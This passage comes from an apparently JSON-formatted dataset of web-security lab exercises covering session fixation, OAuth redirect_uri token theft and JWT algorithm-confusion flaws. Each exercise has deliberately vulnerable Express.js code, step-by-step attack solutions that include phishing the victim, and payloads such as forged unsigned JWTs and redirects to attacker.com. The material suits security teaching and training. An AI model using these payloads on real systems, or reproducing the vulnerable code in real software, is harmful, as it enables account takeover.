      "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { const { username, password, sessionID } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sessionID] = username; res.redirect(`/dashboard?sessionID=${sessionID}`); } else { res.send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.query.sessionID]; if (user) { res.send(`Dashboard for ${user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(3000);",
      "payloads": [
        "/login?username=carlos&password=carlospass&sessionID=abc123",
        "/dashboard?sessionID=abc123",
        "sessionID=predefined_session_id"
      ]
    },
    {
      "Lab scenario": "OAuth redirect_uri manipulation",
      "Lab Description": "This lab uses OAuth for login via a third-party provider. However, the application does not properly validate the redirect_uri parameter, allowing attackers to steal authorization codes. To solve: Intercept a login request and modify the redirect_uri to an attacker-controlled server, then extract the authorization code.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to intercept the login flow and capture the OAuth authorization request.",
        "Locate the redirect_uri parameter pointing to /oauth-callback.",
        "Change it to your exploit server (e.g., https://attacker.com/callback) and forward the request.",
        "Receive the OAuth code on your exploit server and replay it to the real app’s /oauth-callback endpoint.",
        "Obtain a session token and use it to access the /my-account endpoint as the victim."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login', (req, res) => { const redirect_uri = req.query.redirect_uri; const auth_url = `https://oauth.provider/auth?client_id=abc&redirect_uri=${redirect_uri}&response_type=code`; res.redirect(auth_url); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth.provider/token', { code }); res.cookie('session', token.data.access_token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session) res.send('User Account Data'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "https://oauth.provider/auth?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code",
        "POST /oauth-callback?code=stolen-code",
        "session=<access_token_from_stolen_code>"
      ]
    },
    {
      "Lab scenario": "JWT algorithm confusion in Authorization header",
      "Lab Description": "The application's JWT implementation accepts insecure algorithms during token validation. Specifically, it fails to enforce signature verification when the 'alg' field is modified to 'none'. The application trusts any Authorization: Bearer token that decodes to a valid user structure. To solve: craft a forged JWT token with 'none' algorithm and impersonate the user 'carlos' to access their account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept a request with a valid JWT after logging in.",
        "2. Decode the JWT using jwt.io or a Python script to observe its structure.",
        "3. Change the 'alg' header to 'none' and modify the payload to {\"username\": \"carlos\"}.",
        "4. Remove the JWT signature entirely and set the token as Authorization: Bearer <forged_token>.",
        "5. Send the modified request using Postman or Burp Repeater and observe access to Carlos's account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['carlos', 'admin']; app.get('/account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') { res.send('Account page of carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "{\"alg\": \"none\"} + {\"username\": \"carlos\"}",
        "Authorization: Bearer <unsigned_JWT_with_carlos>"
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation in callback handler",
      "Lab Description": "The OAuth implementation improperly validates the redirect_uri parameter in the authentication flow. An attacker can manipulate the redirect to inject a malicious OAuth token or leak the access_token. To solve: manipulate the OAuth redirect to impersonate a victim user (carlos) and access their profile.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Intercept the OAuth login flow with Burp Suite or OWASP ZAP.",
        "2. Identify the redirect_uri parameter sent in the initial GET request to /oauth/authorize.",
        "3. Modify the redirect_uri to point to your attacker-controlled domain (e.g., https://attacker.com/callback).",
        "4. Capture the access_token redirected to your server and extract it from the query string.",
        "5. Replay an authenticated request using Postman with the stolen token in the Authorization header to impersonate Carlos."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const token = 'access_token_for_carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer access_token_for_carlos') { res.send('Welcome Carlos'); } else { res.status(401).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "GET /oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
        "Captured token: access_token_for_carlos",
        "Authorization: Bearer access_token_for_carlos"
      ]
    },
    {
      "Lab scenario": "Session fixation in Set-Cookie header",
      "Lab Description": "The application assigns session identifiers via a predictable scheme before authentication. It does not regenerate the session ID post-login, allowing attackers to fixate a session ID and later hijack the session once the victim logs in. To solve: pre-assign a session ID, get the victim to log in, and then use the same session ID to access their account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Postman or curl to access the application and receive a Set-Cookie with a session ID.",
        "2. Share the URL with the victim, ensuring the session ID is retained via URL or cookie.",
        "3. Wait for the victim to authenticate using the provided session.",
        "4. Reuse the session ID in a new request using Burp Repeater or curl.",
        "5. Confirm account access by requesting the /account endpoint and solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || `sess-${Date.now()}`; res.cookie('sid', sid); sessions[sid] = { authenticated: false }; res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid]) { sessions[sid].authenticated = true; res.send('Logged in'); } else { res.send('Error'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid] && sessions[sid].authenticated) { res.send('Welcome to Carlos account'); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: sid=sess-1712345678901",
        "Share link with victim using same session ID",
        "Access account with: Cookie: sid=sess-1712345678901"
      ]
    },
    {
      "Lab scenario": "Session fixation via insecure Set-Cookie handling in login endpoint",
      "Lab Description": "The login process fails to invalidate pre-authentication session cookies. The application sets the session ID before the user logs in, and that same session persists after successful authentication. To solve: Hijack Carlos's session by fixing a known session ID before authentication and access his account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1.Use Burp Suite to intercept the initial GET /login request and note the Set-Cookie: sessionId value.",
        "2.Send the unauthenticated sessionId to the victim via a malicious link, ensuring Carlos uses it.",
        "3.Once Carlos logs in using the fixed session ID, use the same session ID cookie to authenticate as him.",
        "4.Replay the GET /my-account request with the fixed session ID cookie.",
        "5.Confirm successful account access by verifying Carlos's account data in the response."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'carlospass' }]; const sessions = {}; app.get('/login', (req, res) => { let sid = Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Logged in'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionId; if (sessions[sid]) res.send(`Account page for ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
      "payloads": [
        "Use predefined sessionId in victim's cookie before login",
        "Replay sessionId in attacker's browser after victim logs in"
      ]
    },
    {
      "Lab scenario": "JWT token tampering with symmetric algorithm substitution",
      "Lab Description": "This application uses JWTs for session management but supports algorithm substitution from RS256 to HS256 using a public key as the secret. To solve: Forge a valid JWT token for Carlos and access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use Burp Suite or Postman to capture the JWT token issued after authentication.",
        "2.Decode the token header and replace \"alg\": \"RS256\" with \"alg\": \"HS256\".",
        "3.Use the server's public key as the HMAC secret key to sign a new JWT with 'username': 'carlos'.",
        "4.Replace the original JWT with your forged token in Authorization: Bearer header.",
        "5.Send a request to GET /my-account and verify access to Carlos's account page."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const privateKey = fs.readFileSync('./private.pem'); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Account data for ${decoded.username}`); } catch { res.status(403).send('Invalid token'); } }); app.listen(4000);",
      "payloads": [
        "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
        "Payload: {\"username\":\"carlos\"}",
        "Sign with HMAC using server's public key as secret"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with open redirect leading to token theft",
      "Lab Description": "The OAuth redirect_uri is not properly validated, enabling redirection to arbitrary domains. The app leaks the OAuth access token in the URL fragment. To solve: Steal Carlos's access token via a crafted phishing link and access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1.Use OWASP ZAP or Burp to observe the OAuth flow and note the redirect_uri parameter.",
        "2.Craft a phishing URL with redirect_uri set to your controlled domain and send it to Carlos.",
        "3.Extract the access_token from the URL fragment once Carlos authenticates.",
        "4.Use the stolen token in an Authorization: Bearer header.",
        "5.Send a GET request to /my-account and verify access to Carlos's data."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'token-for-carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Account data for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
      "payloads": [
        "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com/callback",
        "Use stolen token: Authorization: Bearer token-for-carlos"
      ]
    },
    {
      "Lab scenario": "JWT tampering via algorithm confusion in session token",
      "Lab Description": "This lab's JWT-based session handling is vulnerable to algorithm confusion. The server does not enforce strict verification of the signing algorithm. The application blindly trusts the `alg` field in the token. To solve: Forge a JWT token with algorithm `none` and escalate your privileges to admin to access the admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Burp Suite to intercept the JWT after logging in with a regular user account.",
        "Send the token to Decoder and change the algorithm field in the JWT header from 'HS256' to 'none'.",
        "Remove the signature portion of the token completely.",
        "Modify the payload to include {\"username\":\"admin\"}.",
        "Forward the modified token in an Authorization header and access /admin."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
      ]
    },
    {
      "Lab scenario": "Session fixation via insecure session regeneration",
      "Lab Description": "This lab's session handling mechanism is vulnerable to session fixation. The server does not regenerate session IDs after successful login, allowing an attacker to set the session ID beforehand. To solve: Fix a known session ID, trick the victim into logging in, and access their session to view the My Account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Postman to initiate a session as an attacker and capture the fixed session ID.",
        "Send a phishing link to the victim that includes the session ID as a cookie.",
        "Wait for the victim to log in using the provided session.",
        "Use the same session ID to access their account.",
        "Navigate to /my-account to verify access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = { carlos: 'pass123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.username = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') { res.send('Carlos account accessed'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4001; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "Cookie: connect.sid=sess:abcd1234",
        "Phishing link with pre-set cookie: document.cookie = 'connect.sid=sess:abcd1234';"
      ]
    },
    {
      "Lab scenario": "OAuth redirect URI manipulation",
      "Lab Description": "This lab simulates a misconfigured OAuth flow that allows redirect URI manipulation. The authorization server does not validate the redirect URI against a whitelist. To solve: Manipulate the redirect URI to intercept an OAuth authorization code and reuse it to log in as Carlos.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Using Burp Suite, initiate the OAuth login flow and intercept the authorization request.",
        "Modify the `redirect_uri` parameter to a malicious domain under your control.",
        "Host a listener to capture the authorization code sent by the OAuth server.",
        "Exchange the captured code manually for an access token via Postman.",
        "Use the access token to authenticate as Carlos and access /my-account."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const redirectMap = {}; app.get('/auth', (req, res) => { const { code, redirect_uri } = req.query; if (!code) { const authURL = `https://oauth.example.com/auth?response_type=code&client_id=client123&redirect_uri=${redirect_uri}`; res.redirect(authURL); } else { redirectMap[code] = redirect_uri; res.send('Code received'); } }); app.get('/callback', async (req, res) => { const { code } = req.query; const redirect_uri = redirectMap[code]; const tokenResponse = await axios.post('https://oauth.example.com/token', { code, redirect_uri }); const accessToken = tokenResponse.data.access_token; if (accessToken === 'carlos-token') { res.send('Welcome Carlos'); } else { res.status(403).send('Invalid token'); } }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Redirect Lab running at http://localhost:${PORT}`));",
      "payloads": [
        "https://oauth.example.com/auth?client_id=client123&redirect_uri=https://attacker.com/callback",
        "Authorization: Bearer carlos-token"
      ]
    },
    {
      "Lab scenario": "Session Fixation via Predictable Session ID",
      "Lab Description": "This lab's session management is vulnerable to session fixation. The server accepts session IDs from unauthenticated users and does not regenerate them upon login. The application stores the session ID in a cookie named sid. To solve: hijack Carlos's session and access his account page using a fixed session ID set before login.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Capture pre-login traffic in Burp Suite and note the sid cookie structure",
        "Send a crafted request with a preset sid and log in as Carlos",
        "Craft a link with the same sid value and send it to Carlos",
        "After Carlos logs in, reuse the fixed sid to hijack the session",
        "Verify access to /my-account to solve the lab"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecret' }]; const sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username === 'carlos') res.send('Welcome to your account, Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
      "payloads": [
        "sid=fix123; login as carlos",
        "GET /my-account with Cookie: sid=fix123",
        "Phish Carlos with URL using sid=fix123"
      ]
    },
    {
      "Lab scenario": "JWT tampering due to missing signature validation",
      "Lab Description": "This lab is vulnerable to JWT tampering. The backend decodes JWTs without validating their signatures. JWTs are used for user authentication and passed via Authorization headers. To solve: forge a valid JWT identifying as Carlos and access his profile endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Capture JWT from your login session using Burp Suite",
        "Decode the JWT using jwt.io and inspect the payload",
        "Modify payload to {\"user\":\"carlos\"} and change alg to none",
        "Remove the signature part and replay token in Authorization header",
        "Send GET /profile and verify access to Carlos's account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.send({ token }); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.user === 'carlos') return res.send('Carlos profile data'); res.status(403).send('Access denied'); }); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
        "Authorization: Bearer [forged_token]",
        "{\"alg\":\"none\",\"user\":\"carlos\"}"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration: open redirect token theft",
      "Lab Description": "The lab contains an OAuth implementation with an open redirect in the redirect_uri parameter. The application does not validate redirect URIs strictly, enabling attackers to steal OAuth authorization codes. To solve: craft a malicious redirect_uri, capture Carlos's OAuth code, and exchange it for a token to access his account.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Send OAuth request with redirect_uri pointing to attacker-controlled server",
        "Trick Carlos into visiting the crafted OAuth URL",
        "Capture authorization code from your server logs",
        "Exchange code for access token via legitimate OAuth token endpoint",
        "Use the token to access /api/account"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; res.redirect(`${redirectUri}?code=authcode123`); }); app.get('/token', async (req, res) => { const { code } = req.query; if (code === 'authcode123') res.send({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/api/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
      "payloads": [
        "https://victim.com/auth?redirect_uri=https://attacker.com/collect",
        "Captured code=authcode123",
        "GET /token?code=authcode123",
        "Authorization: Bearer token-carlos"
      ]
    },
    {
      "Lab scenario": "GraphQL endpoint exposing JWT manipulation vulnerability",
      "Lab Description": "A GraphQL API implements authentication using a stateless JWT stored in the Authorization header. The server does not validate the token signature, allowing attackers to craft arbitrary JWTs to impersonate users. The application accepts unsigned tokens with alg=none and exposes a GraphQL endpoint. To solve: Forge a JWT as carlos and retrieve his user profile.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "Use Postman to query the /graphql endpoint with a valid JWT to understand token structure",
        "Validate the server ignores signature by crafting a token with alg=none using jwt.io",
        "Edit JWT payload with { \"username\": \"carlos\" } and remove the signature segment",
        "Resend the modified token in Authorization: Bearer header to the GraphQL endpoint",
        "Query { userProfile { email username } } and confirm the username returned is carlos"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { userProfile: User } type User { username: String, email: String }`); const users = { 'carlos': { username: 'carlos', email: 'carlos@example.com' } }; app.use('/graphql', (req, res, next) => { const auth = req.headers['authorization']; if (auth) { const token = auth.split(' ')[1]; try { req.user = jwt.decode(token); } catch (e) { return res.status(401).send('Invalid Token'); } } next(); }, graphqlHTTP(req => ({ schema: schema, rootValue: { userProfile: () => users[req.user?.username] }, graphiql: false }))); app.listen(4000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
        "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
      ]
    },
    {
      "Lab scenario": "Session fixation via predictable session ID in login workflow",
      "Lab Description": "This application assigns session IDs before login using a predictable UUIDv4 generator. After login, the same session ID remains active. The attacker can set their session ID and then trick the victim into using it. When the victim logs in, the attacker gains access to their session. To solve: Hijack Carlos's session and access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use Burp Suite to capture a GET /login request and notice the Set-Cookie: session= field uses predictable UUIDs",
        "Send a request with a custom session ID like session=123e4567-e89b-12d3-a456-426614174000 before login",
        "Send this crafted link with the same session ID to carlos (simulate using Burp Collaborator or inject via referrer)",
        "Wait for Carlos to log in through the crafted link which ties his account to attacker session",
        "Reuse the same session ID to access /my-account as carlos"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const uuid = require('uuid'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'password123' }; app.get('/login', (req, res) => { const sid = req.cookies.session || uuid.v4(); res.cookie('session', sid); res.send('<form method=\"POST\">Username: <input name=\"username\"><br>Password: <input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.send('Not authenticated'); }); app.listen(4000);",
      "payloads": [
        "Cookie: session=123e4567-e89b-12d3-a456-426614174000",
        "Cookie: session=deadbeef-dead-beef-dead-beefdeadbeef"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration in third-party login integration",
      "Lab Description": "The application integrates with a third-party OAuth provider but does not validate the returned access token properly. Attackers can reuse tokens issued to different clients. The misconfiguration stems from missing audience (aud) validation. To solve: Use a token issued for another app to log in as carlos.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "Use OWASP ZAP or Postman to initiate OAuth login for your own account and capture the access token returned",
        "Notice the JWT contains claims for sub, aud, and email, but the app only checks sub for identity",
        "Obtain a token from the same OAuth provider issued to a different client_id but for sub=carlos",
        "Replace your token with the forged one in the Authorization header and send a request to /auth/callback",
        "Verify access by accessing the protected /my-account endpoint and observing Carlos’s profile"
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { 'carlos': { email: 'carlos@example.com' } }; app.get('/auth/callback', (req, res) => { const token = req.query.token; try { const decoded = jwt.decode(token); req.user = decoded.sub; } catch (err) { return res.status(400).send('Invalid token'); } res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.user && users[req.user]) { res.send(`User: ${req.user}, Email: ${users[req.user].email}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
      "payloads": [
        "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJmYWtlLW90aGVyLWFwcCJ9.signature",
        "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJtb2NrLWFwcCJ9."
      ]
    },
    {
      "Lab scenario": "JWT tampering via algorithm confusion in authorization header",
      "Lab Description": "This lab's authorization system uses JWT tokens for user identity and access control. The server validates tokens based on the algorithm specified in the token header without enforcing expected signing algorithms. The application naively accepts tokens signed with the 'none' algorithm. To solve: Craft a JWT token that impersonates the 'admin' user and access the /admin panel.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Intercept the login request using Burp Suite and extract the JWT from the Authorization header.",
        "2. Decode the token at jwt.io or using a script to examine the header and payload. Confirm that the server allows algorithm substitution.",
        "3. Modify the JWT header to set \"alg\": \"none\" and set the payload to {\"username\":\"admin\"}.",
        "4. Remove the signature portion entirely and resend the modified token in the Authorization header using Postman or Burp Repeater.",
        "5. Send a GET request to /admin with the forged JWT and verify access is granted."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const users = [{ username: 'admin' }, { username: 'wiener' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, 'supersecret', { algorithms: [payload.header.alg] }); if (verified.username === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
      "payloads": [
        "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
        "{\"alg\":\"none\"}.{ \"username\":\"admin\" }.",
        "Authorization: Bearer <unsigned-admin-token>"
      ]
    },
    {
      "Lab scenario": "Session fixation through predictable session token reuse",
      "Lab Description": "The lab's login mechanism assigns session tokens before authentication, but does not regenerate them afterward. The application uses cookies to maintain session state. An attacker can set a session ID before victim login, and it will be reused after successful authentication. To solve: Fixate Carlos's session ID and access his account page.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp Suite to capture the GET /login request and note the Set-Cookie header issuing the session ID.",
        "2. Share this crafted session ID with the victim (Carlos) using social engineering or embedding it in a phishing page.",
        "3. After Carlos logs in, reuse the same session ID to impersonate him by replaying it in a request to /my-account.",
        "4. Use the session cookie in Burp Repeater to make an authenticated request to /my-account.",
        "5. Confirm that the session token grants access to Carlos's profile, solving the lab."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'secret123' }]; app.get('/login', (req, res) => { const sid = req.cookies.sid || uuid.v4(); res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"/><input name=\"password\"/><input type=\"submit\"/></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') { res.send('Sensitive info of Carlos'); } else { res.send('Unauthorized'); } }); app.listen(4000);",
      "payloads": [
        "GET /login with preset cookie: sid=attacker123",
        "POST /login with credentials for Carlos using sid=attacker123",
        "GET /my-account with same sid=attacker123"
      ]
    },
    {
      "Lab scenario": "OAuth misconfiguration with token leakage via redirect_uri manipulation",
      "Lab Description": "This lab's third-party OAuth implementation fails to properly validate redirect_uri parameters. The attacker can inject a malicious endpoint to steal access tokens via a crafted URL. The application uses OAuth for logging in users. To solve: Leak Carlos's token and use it to access his profile endpoint.",
      "Difficulty Level": "Hard",
      "Solution Steps": [
        "1. Use Burp to observe the OAuth login flow. Identify the authorization endpoint and check how redirect_uri is handled.",
        "2. Inject your controlled endpoint (e.g., attacker.com/callback) into the redirect_uri parameter to intercept the token.",
        "3. Send the crafted authorization URL to Carlos (phishing/social engineering). Wait for him to click and authorize.",
        "4. Capture the token in your server logs (access_token in query string or fragment).",
        "5. Replay an authenticated request with the stolen token to /api/profile and confirm access."
      ],
      "Vulnerability name": "Authentication",
      "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123token' }; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id === 'trusted-client' && response_type === 'token') { const token = tokens['carlos']; const redir = `${redirect_uri}#access_token=${token}`; res.redirect(redir); } else { res.status(400).send('Invalid request'); } }); app.get('/api/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123token') { res.send('Carlos profile data'); } else { res.status(401).send('Unauthorized'); } }); app.listen(8080);",
      "payloads": [
        "https://target.com/oauth/authorize?client_id=trusted-client&redirect_uri=https://attacker.com/callback&response_type=token",
        "GET /api/profile with header Authorization: Bearer abc123token",
        "#access_token=abc123token intercepted from attacker.com logs"
      ]
    },
    {
      "Lab scenario": "JWT tampering via none algorithm in authorization header",
      "Lab Description": "The application uses JSON Web Tokens (JWT) for session management, but fails to validate the signature algorithm securely. It accepts tokens with the 'alg' set to 'none' without verifying the signature. The application blindly trusts the decoded payload. To solve: Craft a tampered JWT token impersonating the user 'carlos' and access their account page.",
      "Difficulty Level": "Medium",
      "Solution Steps": [
        "1. Use Burp Suite to intercept a request to /my-account while logged in with your own user.",
        "2. Extract the JWT token from the Authorization header and decode it using jwt.io or Burp Decoder.",
        "3. Modify the payload to { \"username\": \"carlos\" } and set the header to { \"alg\": \"none\" }, then remove the signature.",
        "4. Replace the Authorization header value with your modified unsigned token.",
        "5. Forward the modified request to /my-account and verify if Carlos's account data is accessible."
      ],
      "Vulnerability name": "Authentication",
